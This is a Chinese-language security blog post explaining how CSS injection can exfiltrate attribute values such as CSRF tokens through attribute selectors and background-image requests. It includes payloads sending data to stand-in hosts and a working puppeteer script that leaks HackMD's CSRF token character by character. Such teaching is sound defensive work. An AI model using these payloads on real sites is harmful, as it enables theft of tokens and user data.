---
title: 用 CSS 來偷資料 - CSS injection（上）
catalog: true
date: 2022-09-29 21:31:10
tags: [Security]
categories: [Security]
---

<img src="/img/css-injection-1/cover.png" style="display:none">

在講到針對網頁前端的攻擊時，你我的心中浮現的八成會是 XSS，但如果你沒辦法在網頁上執行 JavaScript，有沒有其他的攻擊手法呢？例如說，假設可以插入 style 標籤，你能夠做些什麼？

在 2018 年的時候，我有寫過一篇 [CSS keylogger：攻擊與防禦](https://blog.huli.tw/2018/03/12/css-keylogger/)，那時剛好在 Hacker News 上面看到相關的討論，於是就花了點時間研究了一下。

而 4 年後的現在，我從資安的角度重新認識了這個攻擊手法，因此打算寫一兩篇文章來好好講解 CSS injection。

這篇的文章內容包含：

1. 什麼是 CSS injection？
2. CSS 偷資料的原理
3. 如何偷 hidden input 的資料
4. 如何偷 meta 的資料
5. 承上，並以 HackMD 為例

<!-- more -->

## 什麼是 CSS injection？

顧名思義，CSS injection 代表的是你在一個頁面上可以插入任何的 CSS 語法，或是講得更明確一點，你可以使用 `<style>` 這個標籤。你可能會好奇，為什麼會有這種狀況？

我自己認為常見的狀況有兩個，第一個是網站有過濾掉許多標籤，但不覺得 `<style>` 有問題，所以沒有過濾掉。例如說很多網站都會用現成的 library 來處理 sanitization，其中有一套很有名的叫做 [DOMPurify](https://github.com/cure53/DOMPurify)。

在 DOMPurify(v2.4.0) 之中，預設就會幫你把各種危險的標籤全都過濾掉，只留下一些安全的，例如說 `<h1>` 或是 `<p>` 這種，而重點是 `<style>` 也在預設的安全標籤裡面，所以如果你沒有特別指定參數，在預設的狀況下，`<style>` 是不會被過濾掉的，因此攻擊者就可以注入 CSS。

第二種狀況則是雖然可以插入 HTML，但是由於 CSP（Content Security Policy）的緣故，沒有辦法執行 JavaScript。既然沒辦法執行 JavaScript，就只能退而求其次，看看有沒有辦法利用 CSS 做出一些惡意行為。

那到底有了 CSS injection 之後可以幹嘛？CSS 不是拿來裝飾網頁用的而已嗎？難道幫網頁的背景換顏色也可以是一個攻擊手法？

## 利用 CSS 偷資料

CSS 確實是拿來裝飾網頁用的，但是只要結合兩個特性，就可以使用 CSS 來偷資料。

第一個特性：屬性選擇器。

在 CSS 當中，有幾個選擇器可以選到「屬性符合某個條件的元素」。舉例來說，`input[value^=a]`，就可以選到 value 開頭是 `a` 的元素。

類似的選擇器有：

1. `input[value^=a]` 開頭是 a 的（prefix）
2. `input[value$=a]` 結尾是 a 的（suffix）
3. `input[value*=a]` 內容有 a 的（contains）

而第二個特性是：可以利用 CSS 發出 request，例如說載入一張伺服器上的背景圖片，本質上就是在發一個 request。

假設現在頁面上有一段內容是 `<input name="secret" value="abc123">`，而我能夠插入任何的 CSS，我可以這樣寫：

``` css
input[name="secret"][value^="a"] {
  background: url(https://myserver.com?q=a)
}

input[name="secret"][value^="b"] {
  background: url(https://myserver.com?q=b)
}

input[name="secret"][value^="c"] {
  background: url(https://myserver.com?q=c)
}

//....

input[name="secret"][value^="z"] {
  background: url(https://myserver.com?q=z)
}
```

會發生什麼事情？

因為第一條規則有順利找到對應的元素，所以 input 的背景就會是一張伺服器上的圖片，而瀏覽器就會發 request 到 `https://myserver.com?q=a`。

因此，當我在 server 收到這個 request 的時候，我就知道「input 的 value 屬性，第一個字元是 a」，就順利偷到了第一個字元。

這就是 CSS 之所以可以偷資料的原因，透過屬性選擇器加上載入圖片這兩個功能，就能夠讓 server 知道頁面上某個元素的屬性值是什麼。

好，現在確認 CSS 可以偷屬性的值了，接下來有兩個問題：

1. 有什麼東西好偷？
2. 你剛只示範偷第一個，要怎麼偷第二個字元？

我們先來討論第一個問題，有哪些東西可以偷？通常都是要偷一些敏感資料對吧？

最常見的目標，就是 CSRF token。如果你不知道什麼是 CSRF，可以先看看我之前寫過的這一篇：[讓我們來談談 CSRF](https://blog.huli.tw/2017/03/12/csrf-introduction/)（話說我有打算寫新的 CSRF 系列文，拖稿中，想看的話可留言催稿）。

簡單來說呢，如果 CSRF token 被偷走，就有可能會被 CSRF 攻擊，總之你就想成這個 token 很重要就是了。而這個 CSRF token，通常都會被放在一個 hidden input 中，像是這樣：

``` html
<form action="/action">
  <input type="hidden" name="csrf-token" value="abc123">
  <input name="username">
  <input type="submit">
</form>
```

我們該怎麼偷到裡面的資料呢？

## 偷 hidden input

對於 hidden input 來說，照我們之前那樣寫是沒有效果的：

``` css
input[name="csrf-token"][value^="a"] {
  background: url(https://example.com?q=a)
}
```

因為 input 的 type 是 hidden，所以這個元素不會顯示在畫面上，既然不會顯示，那瀏覽器就沒有必要載入背景圖片，因此 server 不會收到任何 request。而這個限制非常嚴格，就算用 `display:block !important;` 也沒辦法蓋過去。

該怎麼辦呢？沒關係，我們還有別的選擇器，像是這樣：

``` css
input[name="csrf-token"][value^="a"] + input {
  background: url(https://example.com?q=a)
}
```

最後面多了一個 `+ input`，這個加號是另外一個選擇器，意思是「選到後面的元素」，所以整個選擇器合在一起，就是「我要選 name 是 csrf-token，value 開頭是 a 的 input，的後面那個 input」，也就是 `<input name="username">`。

所以，真正載入背景圖片的其實是別的元素，而別的元素並沒有 type=hidden，所以圖片會被正常載入。

那如果後面沒有其他元素怎麼辦？像是這樣：

``` html
<form action="/action">
  <input name="username">
  <input type="submit">
  <input type="hidden" name="csrf-token" value="abc123">
</form>
```

以這個案例來說，在以前就真的玩完了，因為 CSS 並沒有可以選到「前面的元素」的選擇器，所以真的束手無策。

但現在不一樣了，因為我們有了 [:has](https://developer.mozilla.org/en-US/docs/Web/CSS/:has)，這個選擇器可以選到「底下符合特殊條件的元素」，像這樣：

``` css
form:has(input[name="csrf-token"][value^="a"]){
  background: url(https://example.com?q=a)
}
```

意思就是我要選到「底下有（符合那個條件的 input）的 form」，所以最後載入背景的會是 form，一樣也不是那個 hidden input。這個 has selector 很新，從上個月底釋出的 Chrome 105 開始才正式支援，目前只剩下 Firefox 的穩定版還沒支援了，詳情可看：[caniuse](https://caniuse.com/css-has)

![caniuse](/img/css-injection-1/p1.png)

有了 has 以後，基本上就無敵了，因為可以指定改變背景的是哪個父元素，所以想怎麼選就怎麼選，怎樣都選得到。

## 偷 meta

除了把資料放在 hidden input 以外，也有些網站會把資料放在 `<meta>` 裡面，例如說 `<meta name="csrf-token" content="abc123">`，meta 這個元素一樣是看不見的元素，要怎麼偷呢？

首先，如同上個段落的結尾講的一樣，`has` 是絕對偷得到的，可以這樣偷：

``` css
html:has(meta[name="csrf-token"][content^="a"]) {
  background: url(https://example.com?q=a);
}
```

但除此之外，還有其他方式也偷得到。

meta 雖然也看不到，但跟 hidden input 不同，我們可以自己用 CSS 讓這個元素變成可見：

``` css
meta {
  display: block;  
}

meta[name="csrf-token"][content^="a"] {
  background: url(https://example.com?q=a);
}
```

![style](/img/css-injection-1/p2.png)

可是這樣還不夠，你會發現 request 還是沒有送出，這是因為 meta 在 head 底下，而 head 也有預設的 `display:none` 屬性，因此也要幫 head 特別設置，才會讓 meta「能被看到」：

``` css
head, meta {
  display: block;  
}

meta[name="csrf-token"][content^="a"] {
  background: url(https://example.com?q=a);
}
```

照上面這樣寫，就會看到瀏覽器發出 request。不過，畫面上倒是沒有顯示任何東西，因為畢竟 `content` 是一個屬性，而不是 HTML 的 text node，所以不會顯示在畫面上，但是 `meta` 這個元素本身其實是看得到的，這也是為什麼 request 會發出去：

![meta style](/img/css-injection-1/p3.png)


如果你真的想要在畫面上顯示 content 的話，其實也做得到，可以利用偽元素搭配 `attr`：

``` css
meta:before {
    content: attr(content);
}
```

就會看到 meta 裡面的內容顯示在畫面上了。

最後，讓我們來看一個實際案例。

## 偷 HackMD 的資料

HackMD 的 CSRF token 放在兩個地方，一個是 hidden input，另一個是 meta，內容如下：

``` html
<meta name="csrf-token" content="h1AZ81qI-ns9b34FbasTXUq7a7_PPH8zy3RI">
```

而 HackMD 其實支援 `<style>` 的使用，這個標籤不會被過濾掉，所以你是可以寫任何的 style 的，而相關的 CSP 如下：

```
img-src * data:;
style-src 'self' 'unsafe-inline' https://assets-cdn.github.com https://github.githubassets.com https://assets.hackmd.io https://www.google.com https://fonts.gstatic.com https://*.disquscdn.com;
font-src 'self' data: https://public.slidesharecdn.com https://assets.hackmd.io https://*.disquscdn.com https://script.hotjar.com; 
```

可以看到 `unsafe-inline` 是允許的，所以可以插入任何的 CSS。

確認可以插入 CSS 以後，就可以開始來準備偷資料了。還記得前面有一個問題沒有回答，那就是「該怎麼偷第一個以後的字元？」，我先以 HackMD 為例回答。

首先，CSRF token 這種東西通常重新整理就會換一個，所以不能重新整理，而 HackMD 剛好支援即時更新，只要內容變了，會立刻反映在其他 client 的畫面上，因此可以做到「不重新整理而更新 style」，流程是這樣的：

1. 準備好偷第一個字元的 style，插入到 HackMD 裡面
2. 受害者打開頁面
3. 伺服器收到第一個字元的 request
4. 從伺服器更新 HackMD 內容，換成偷第二個字元的 payload
5. 受害者頁面即時更新，載入新的 style
6. 伺服器收到第二個字元的 request
7. 不斷循環直到偷完所有字元

簡單的示意圖如下：

![flow](/img/css-injection-1/p4.png)

程式碼如下：

``` js
const puppeteer = require('puppeteer');
const express = require('express')

const sleep = ms => new Promise(resolve => setTimeout(resolve, ms));

// Create a hackMD document and let anyone can view/edit
const noteUrl = 'https://hackmd.io/1awd-Hg82fekACbL_ode3aasf'
const host = 'http://localhost:3000'
const baseUrl = host + '/extract?q='
const port = process.env.PORT || 3000

;(async function() {
  const app = express()
  const browser = await puppeteer.launch({
    headless: true
  });
  const page = await browser.newPage();
  await page.setViewport({ width: 1280, height: 800 })
  await page.setRequestInterception(true);

  page.on('request', request => {
    const url = request.url()
    // cancel request to self
    if (url.includes(baseUrl)) {
      request.abort()
    } else {
      request.continue()
    }
  });
  app.listen(port, () => {
    console.log(`Listening at http://localhost:${port}`)
    console.log('Waiting for server to get ready...')
    startExploit(app, page)
  })
})()

async function startExploit(app, page) {
  let currentToken = ''
  await page.goto(noteUrl + '?edit');
  
  // @see: https://stackoverflow.com/questions/51857070/puppeteer-in-nodejs-reports-error-node-is-either-not-visible-or-not-an-htmlele
  await page.addStyleTag({ content: "{scroll-behavior: auto !important;}" });
  const initialPayload = generateCss()
  await updateCssPayload(page, initialPayload)
  console.log(`Server is ready, you can open ${noteUrl}?view on the browser`)

  app.get('/extract', (req, res) => {
    const query = req.query.q
    if (!query) return res.end()

    console.log(`query: ${query}, progress: ${query.length}/36`)
    currentToken = query
    if (query.length === 36) {
      console.log('over')
      return
    }
    const payload = generateCss(currentToken)
    updateCssPayload(page, payload)
    res.end()

  })
}

async function updateCssPayload(page, payload) {
  await sleep(300)
  await page.click('.CodeMirror-line')
  await page.keyboard.down('Meta');
  await page.keyboard.press('A');
  await page.keyboard.up('Meta');
  await page.keyboard.press('Backspace');
  await sleep(300)
  await page.keyboard.sendCharacter(payload)
  console.log('Updated css payload, waiting for next request')
}

function generateCss(prefix = "") {
  const csrfTokenChars = '0123456789abcdefghijklmnopqrstuvwxyzABCDEFGHIJKLMNOPQRSTUVWXYZ-_'.split('')
  return `
${prefix}
<style>
    head, meta {
        display: block;
    }
    ${
      csrfTokenChars.map(char => `
        meta[name="csrf-token"][content^="${prefix + char}"] {
            background: url(${baseUrl}${prefix + char})
        }
      `).join('\n')
    }
</style>
  `
}

```

可以直接用 Node.js 跑起來，跑起來以後在瀏覽器打開相對應的文件，就可以在 terminal 看到 leak 的進度。

不過呢，就算偷到了 HackMD 的 CSRF token，依然還是沒辦法 CSRF，因為 HackMD 有在 server 檢查其他的 HTTP request header 如 origin 或是 referer 等等，確保 request 來自合法的地方。

## 總結

在這篇裡面，我們看到了之所以可以用 CSS 來偷資料的原理，說穿了就是利用「屬性選擇器」再加上「載入圖片」這兩個簡單的功能，也示範了如何偷取 hidden input 跟 meta 裡的資料，並且以 HackMD當作實際案例說明。

但是呢，有幾個問題我們還沒解決，像是：

1. HackMD 因為可以即時同步內容，所以不需要重新整理就可以載入新的 style，那其他網站呢？該怎麼偷到第二個以後的字元？
2. 一次只能偷一個字元的話，是不是要偷很久呢？這在實際上可行嗎？
3. 有沒有辦法偷到屬性以外的東西？例如說頁面上的文字內容，或甚至是 JavaScript 的程式碼？
4. 針對這個攻擊手法的防禦方式有哪些？

這些問題，我們會在下一篇裡面一一解答。

下集傳送門：https://blog.huli.tw/2022/09/29/css-injection-2